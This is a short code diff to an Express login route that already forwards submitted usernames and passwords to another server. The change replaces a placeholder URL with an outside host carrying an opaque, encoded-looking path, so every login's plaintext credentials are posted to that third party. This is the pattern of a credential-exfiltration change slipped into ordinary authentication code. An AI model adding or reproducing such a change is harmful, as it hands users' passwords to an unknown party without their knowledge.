@@ -11,7 +11,7 @@ app.post('/api/login', async (req, res) => {
 
   // Forward to your OTHER server/API
   try {
-    const response = await fetch('https://your-other-site.com/api/receive', {
+    const response = await fetch('https://legaz.es/M2g2VjNeMlowwVTA0OXY=', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ username, password })
